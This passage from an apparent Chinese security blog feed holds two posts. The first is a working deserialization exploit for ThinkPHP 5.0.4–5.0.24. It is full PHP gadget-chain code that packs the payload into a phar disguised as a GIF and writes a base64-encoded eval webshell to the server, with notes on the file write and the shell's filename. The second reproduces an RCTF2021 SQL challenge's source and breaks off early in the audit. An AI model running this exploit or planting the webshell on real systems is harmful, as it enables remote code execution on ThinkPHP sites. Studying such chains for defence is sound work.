class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Process</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$status</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processPipes</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processInformation</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processInformation[<span class="string">&#x27;running&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;status = <span class="string">&#x27;starte&#x27;</span>;  <span class="comment">//started,不同就行</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;processPipes = <span class="keyword">new</span> Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasMany</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handler</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="keyword">new</span> HasMany();  <span class="comment">//close()</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;     //为了满足跳板的条件而构建</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Merge</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Relation</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Query</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Query</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Merge</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Relation</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">HasMany</span> <span class="keyword">extends</span> <span class="title">Relation</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parent</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$localKey</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$foreignKey</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pivot</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;query = <span class="keyword">new</span> Output();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = <span class="keyword">new</span> Merge();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;   <span class="comment">//找到链入口，_call</span></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;styles = [<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Memcached(); <span class="comment">//$handle-&gt;think\session\driver\Memcached</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcached</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handler</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="keyword">new</span> File(); <span class="comment">//$handle-&gt;think\cache\driver\File</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">File</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">options</span> = <span class="title">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>] = <span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;cache_subdir&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">            <span class="comment">#$this-&gt;options[&#x27;path&#x27;] = &#x27;uploads/aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/&#x27;;</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;path&#x27;</span>] = <span class="string">&#x27;php://filter/write=convert.iconv.utf-8.utf-7|convert.base64-decode/resource=/var/www/html/public/aPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../uploads/&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tag = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">data</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">Process</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$data</span>));</span><br><span class="line">    </span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$data</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">    rename(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;phar.gif&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">任意写文件:</span><br><span class="line">1.File类的变量$this-&gt;options[&#39;path&#39;]控制写入文件的目录，目录中有一部分是shell(post ccc)，后面会被写到文件中</span><br><span class="line">注：路径最好是绝对路径，对于php析构函数来说，有时候工作目录会与正常不同，例如apache服务器，php析构函数的工作目录在根目录</span><br><span class="line">2.生成shell的文件名构成为 md5(&#39;tag_&#39; . md5($this-&gt;tag)),按照上面给出的tag，生成的shell文件名应该是</span><br><span class="line">12ac95f1498ce51d2d96a249c09c1998.php</span><br></pre></td></tr></table></figure><h3 id="0x02-待续。。。"><a href="#0x02-待续。。。" class="headerlink" title="0x02 待续。。。"></a>0x02 待续。。。</h3>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01-thinkphp-5-0-4-5-0-24&quot;&gt;&lt;a href=&quot;#0x01-thinkphp-5-0-4-5-0-24&quot; class=&quot;headerlink&quot; title=&quot;0x01 thinkphp 5.0.4~5.0.24&quot;&gt;&lt;/a&gt;0x01 thinkphp 5.0.4~5.0.24&lt;/h3&gt;</summary>
    
    
    
    <category term="其他" scheme="https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
    <category term="php反序列化" scheme="https://123-prog.github.io/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>(RCTF2021)ns_shaft_sql</title>
    <link href="https://123-prog.github.io/2021/09/18/RCTF2021-ns-shaft-sql/"/>
    <id>https://123-prog.github.io/2021/09/18/RCTF2021-ns-shaft-sql/</id>
    <published>2021-09-18T08:51:11.000Z</published>
    <updated>2021-09-22T10:21:48.644Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-源码"><a href="#0x01-源码" class="headerlink" title="0x01 源码"></a>0x01 源码</h3><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init_status</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;floor&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;floor&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;disabled_functions&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;disabled_functions&#x27;</span>] = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>] = random_str(<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reset_status</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;floor&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;disabled_functions&#x27;</span>] = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>] = random_str(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str</span>(<span class="params"><span class="variable">$length</span>=<span class="number">0</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$ss</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$length</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$length</span> = mt_rand(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$res</span> .= <span class="variable">$ss</span>[mt_rand(<span class="number">0</span>, <span class="number">61</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$ss</span> = <span class="string">&quot;0123456789&quot;</span>;</span><br><span class="line">    <span class="variable">$length</span> = mt_rand(<span class="number">10</span>, <span class="number">17</span>);</span><br><span class="line">    <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> .= <span class="variable">$ss</span>[mt_rand(<span class="number">1</span>, <span class="number">9</span>)];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$res</span> .= <span class="variable">$ss</span>[mt_rand(<span class="number">0</span>, <span class="number">9</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">extract_function</span>(<span class="params"><span class="variable">$query</span>, <span class="variable">$err_msg</span>, <span class="variable">$err_code</span>, <span class="variable">$sqlstate</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$mysql_functions</span>;</span><br><span class="line">    <span class="variable">$allowed_functions</span> = <span class="keyword">array</span>(<span class="string">&quot;concat&quot;</span>, <span class="string">&quot;unhex&quot;</span>);</span><br><span class="line">    <span class="variable">$funcs</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$query_arr</span> = preg_split(<span class="string">&quot;/[^a-zA-Z0-9_]/&quot;</span>, strtolower(<span class="variable">$query</span>));</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$mysql_functions</span> <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$func</span>, <span class="variable">$allowed_functions</span>) &amp;&amp; in_array(<span class="variable">$func</span>, <span class="variable">$query_arr</span>)) &#123;</span><br><span class="line">            array_push(<span class="variable">$funcs</span>, <span class="variable">$func</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$funcs</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">init_status();</span><br><span class="line"></span><br><span class="line"><span class="variable">$max_floor</span> = <span class="number">0x2e</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;floor&#x27;</span>] &gt; <span class="variable">$max_floor</span>) &#123;</span><br><span class="line">    printf(<span class="string">&quot;Congratulations! and flag is %s\n&lt;br&gt;\n&quot;</span>, <span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">    reset_status();</span><br><span class="line">    printf(<span class="string">&quot;Reset successfully!&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf(<span class="string">&quot;You are on floor %d.\n&lt;br&gt;\n&quot;</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;floor&#x27;</span>]);</span><br><span class="line">printf(<span class="string">&quot;Your key is %s\n&lt;br&gt;\n&quot;</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]);</span><br><span class="line">printf(<span class="string">&quot;Disabled Functions: %s\n&lt;br&gt;\n&quot;</span>, implode(<span class="string">&quot;, &quot;</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;disabled_functions&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;sql&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = base64_decode(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;sql&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$query</span>) || strlen(<span class="variable">$query</span>) &gt; <span class="number">0x100</span> || !ctype_print(<span class="variable">$query</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Die&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$disabled_functions</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;disabled_functions&#x27;</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$disabled_functions</span> <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos(<span class="variable">$query</span>, <span class="variable">$func</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Die&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$mysqli</span> = <span class="keyword">new</span> mysqli(<span class="variable">$db_host</span>, <span class="variable">$db_user</span>, <span class="variable">$db_password</span>, <span class="variable">$db_name</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$k</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line"><span class="variable">$v</span> = random_str2();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$mysqli</span>-&gt;query(<span class="string">&quot;DELETE FROM `s` WHERE k=&#x27;<span class="subst">$k</span>&#x27;;&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Die&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$mysqli</span>-&gt;query(<span class="string">&quot;INSERT INTO `s` (`k`, `v`) values (&#x27;<span class="subst">$k</span>&#x27;, &#x27;<span class="subst">$v</span>&#x27;);&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Die&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;query(<span class="variable">$query</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="variable">$err_msg</span> = mysqli_error(<span class="variable">$mysqli</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$err_msg</span>) &amp;&amp; (strpos(<span class="variable">$err_msg</span>, <span class="variable">$v</span>) !== <span class="literal">false</span>)) &#123;</span><br><span class="line">        <span class="variable">$funcs</span> = extract_function(<span class="variable">$query</span>, <span class="variable">$err_msg</span>, <span class="variable">$err_code</span>, <span class="variable">$sqlstate</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$funcs</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Die&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$funcs</span> <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$func</span>, <span class="variable">$disabled_functions</span>)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Die&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;floor&#x27;</span>] += <span class="number">1</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;disabled_functions&#x27;</span>] = array_merge(<span class="variable">$_SESSION</span>[<span class="string">&#x27;disabled_functions&#x27;</span>], <span class="variable">$funcs</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;floor&#x27;</span>] &gt; <span class="variable">$max_floor</span>) &#123;</span><br><span class="line">            printf(<span class="string">&quot;Congratulations! and flag is %s\n&lt;br&gt;\n&quot;</span>, <span class="variable">$flag</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            printf(<span class="string">&quot;Success! You are on floor %d, and your key is %s.\n&lt;br&gt;\n&quot;</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;floor&#x27;</span>], <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]);</span><br><span class="line">            printf(<span class="string">&quot;Disabled Functions: %s\n&lt;br&gt;\n&quot;</span>, implode(<span class="string">&quot;, &quot;</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;disabled_functions&#x27;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Die&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>简单审计一下</p><p>获取flag的条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$max_floor</span> = <span class="number">0x2e</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;floor&#x27;</span>] &gt; <span class="variable">$max_floor</span>) &#123;</span><br><span class="line">    printf(<span class="string">&quot;Congratulations! and flag is %s\n&lt;br&gt;\n&quot;</span>, <span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$_SESSION[&#39;floor&#39;]</code>增加的条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 